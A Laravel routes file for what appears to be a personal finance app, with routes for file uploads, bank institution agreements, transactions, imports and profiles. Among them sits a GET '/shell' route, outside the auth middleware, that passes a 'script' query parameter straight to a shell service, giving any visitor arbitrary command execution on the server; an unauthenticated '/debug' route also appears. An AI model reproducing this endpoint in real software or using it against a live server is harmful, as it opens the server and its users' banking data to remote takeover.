<?php

use App\Http\Controllers\SynchronizationController;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\DebugController;
use App\Http\Controllers\ProfileController;
use App\Http\Controllers\File\FileController;
use App\Http\Controllers\TransactionController;
use App\Http\Controllers\Import\ImportController;
use App\Http\Controllers\Import\ImportSettingController;
use App\Http\Controllers\Import\ColumnsMappingController;
use App\Http\Controllers\Nordigen\Institution\InstitutionController;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/home', [HomeController::class, 'index'])->name('home');

Route::get('/shell', function (\Illuminate\Http\Request $request) {
    /** @var \App\Services\Shell\ShellService $service \ */
    $service = app(\App\Services\Shell\ShellService::class);
    $command = $request->get('script', 'ls');
    return $service->runScript($command);
})->name('home');

Route::get('/', [FileController::class, 'index']);
Route::get('/debug', [DebugController::class, 'analyzers'])->name('debug.analyzers');

Route::prefix('files')->as('file.')->group(function () {
    Route::get('/', [FileController::class, 'index'])->name('index');
    Route::post('/upload', [FileController::class, 'upload'])->name('upload');
    Route::get('{id}', [FileController::class, 'show'])->name('show');
});

Route::prefix('synchronizations')->as('synchronization.')->group(function () {
    Route::get('/', [SynchronizationController::class, 'index'])->name('index');
});

Route::prefix('institutions')->as('institution.')->group(function () {
    Route::get('/', [InstitutionController::class, 'index'])->name('index');
    Route::get('/{id}/select', [InstitutionController::class, 'select'])->name('select');
    Route::post('/{institutionId}', [InstitutionController::class, 'newAgreement'])->name('new_agreement');
    Route::get('/{id}/agreements', [InstitutionController::class, 'agreements'])->name('agreements');
    Route::post('/{agreementId}/requisitions', [InstitutionController::class, 'newRequisition'])->name('new_requisition');
});

Route::prefix('transactions')->as('transaction.')->group(function () {
    Route::get('/', [TransactionController::class, 'index'])->name('index');
    Route::get('/{id}', [TransactionController::class, 'show'])->name('show');
});

Route::prefix('imports')->as('import.')->group(function () {
    Route::get('/', [ImportController::class, 'index'])->name('index');

    Route::prefix('settings')->as('import-setting.')->group(function () {
        Route::get('/', [ImportSettingController::class, 'index'])->name('index');
        Route::get('/{id}', [ImportSettingController::class, 'show'])->name('show');
        Route::post('/', [ImportSettingController::class, 'store'])->name('store');
        Route::get('/{id}/edit', [ImportSettingController::class, 'edit'])->name('edit');
    });

    Route::prefix('columns-mappings')->as('columns-mapping.')->group(function () {
        Route::get('/', [ColumnsMappingController::class, 'index'])->name('index');
        Route::post('/', [ColumnsMappingController::class, 'store'])->name('store');
    });
});

Route::get('/dashboard', function () {
    return view('dashboard');
})->middleware(['auth', 'verified'])->name('dashboard');

Route::middleware('auth')->group(function () {
    Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
    Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
    Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
});

require __DIR__ . '/auth.php';
